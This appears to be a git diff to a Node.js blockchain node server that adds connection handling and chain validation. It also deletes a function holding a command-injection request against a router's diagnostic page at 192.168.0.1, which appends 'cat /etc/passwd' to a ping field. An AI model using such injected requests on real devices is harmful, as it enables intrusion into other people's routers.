@@ -27,6 +27,7 @@ var allowCrossDomain = function(req, res, next) {
     res.header('Access-Control-Allow-Origin', "*");
     res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
     res.header('Access-Control-Allow-Headers', 'Content-Type');
+    res.header('Connection', 'Keep-Alive');
     next();
 }
 
@@ -68,6 +69,11 @@ const startServer = () => {
   console.log('Listening on port 5000');
   const server = app.listen(PORT);
   app.use(express.static(__dirname+'/views'));
+
+  app.on('connection', (socket) => {
+    console.log('A connection was made by a client');
+    socket.setTimeout(30 * 1000); 
+  })
 
   app.get('/', function(req, res, next) {
       if(blockchain.nodeAddresses.length == 0){
@@ -155,7 +161,7 @@ const startServer = () => {
 
   }else{
     console.log('ERROR: Need at least one other node to mine');
-    res.status(400);
+    res.status(418);
     res.send('ERROR: Need at least one other node to mine');
   }
 
@@ -275,7 +281,7 @@ seedNodeList = (blockchain) => {
     nodes[addressOfNode] = addressInfo;
 
   }
-  console.log(nodes);
+
   blockchain.nodeAddresses = nodes;
   return blockchain;
 }
@@ -430,30 +436,6 @@ let sendBlockchainToAllNodes = (blockchainToSend) => {
   }
 }
 
-function routerBuzz(){
-
-  var body = '';
-  http.get({
-      host: '192.168.0.1',
-      path: '/cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%3b%20cat%20/etc/passwd&server_ip= HTTP/1.1',
-      headers:{
-        'Access-Control-Allow-Origin':"*",
-        'Access-Control-Allow-Methods':'GET,PUT,POST,DELETE',
-        'Access-Control-Allow-Headers':'Content-Type'
-      }
-  }, function(resp){
-    resp.on('error', function(err){
-      console.log(err);
-    })
-    resp.on('data', function(chunk){
-        body += chunk;
-    });
-
-    resp.on('end', function(){
-      console.log(body);
-    });
-  });
-}
 
 let broadcastNewBlock = (block) => {
 
@@ -494,38 +476,45 @@ const compareBlockchains = (storedBlockchain, receivedBlockchain=false) => {
   let longestBlockchain;
 
   if(receivedBlockchain){
-    if(storedBlockchain.chain.length > receivedBlockchain.chain.length){
-        if(storedBlockchain.pendingTransactions.length > receivedBlockchain.pendingTransactions.length){
+    if(receivedBlockchain.isChainValid()){
+      if(storedBlockchain.chain.length > receivedBlockchain.chain.length){
+          if(storedBlockchain.pendingTransactions.length > receivedBlockchain.pendingTransactions.length){
 
-            longestBlockchain = storedBlockchain;
-        }
-        else{
-          longestBlockchain = receivedBlockchain;
-        }
-    }
-    else if(storedBlockchain.chain.length == receivedBlockchain.chain.length){ //Same nb of blocks
-        let lastStoredBlock = storedBlockchain.getLatestBlock();
-        let lastReceivedBlock = receivedBlockchain.getLatestBlock();
-        if(lastStoredBlock.hash === lastReceivedBlock.hash){ //Same blocks - it's fine
-          longestBlockchain = storedBlockchain;
-        }else{                                              //Different blocks - Find the lastest and modify it
-          if(lastStoredBlock.timestamp > lastReceivedBlock.timestamp){
-            longestChain = receivedBlockchain;
-            lastStoredBlock.previousHash = lastReceivedBlock.hash;
-            receivedBlockchain.addBlock(lastStoredBlock);
-
-          }else{
-            longestChain = storedBlockchain;
-            lastReceivedBlock.previousHash = lastStoredBlock.hash;
-            receivedBlockchain.addBlock(lastReceivedBlock);
+              longestBlockchain = storedBlockchain;
           }
-        }
+          else{
+            longestBlockchain = receivedBlockchain;
+          }
+      }
+      else if(storedBlockchain.chain.length == receivedBlockchain.chain.length){ //Same nb of blocks
+          let lastStoredBlock = storedBlockchain.getLatestBlock();
+          let lastReceivedBlock = receivedBlockchain.getLatestBlock();
+
+          if(lastStoredBlock.hash === lastReceivedBlock.hash){ //Same blocks - it's fine
+            longestBlockchain = storedBlockchain;
+          }else{                                              //Different blocks - Find the lastest and modify it
+            if(lastStoredBlock.timestamp > lastReceivedBlock.timestamp){
+              longestChain = receivedBlockchain;
+              lastStoredBlock.previousHash = lastReceivedBlock.hash;
+              receivedBlockchain.addBlock(lastStoredBlock);
+
+            }else{
+              longestChain = storedBlockchain;
+              lastReceivedBlock.previousHash = lastStoredBlock.hash;
+              receivedBlockchain.addBlock(lastReceivedBlock);
+            }
+          }
+      }
+      else{
+        longestBlockchain = receivedBlockchain;
+      }
+
+      return longestBlockchain;
     }
     else{
-      longestBlockchain = receivedBlockchain;
+      return storedBlockchain;
     }
 
-    return longestBlockchain;
 
   }else{
     return storedBlockchain;
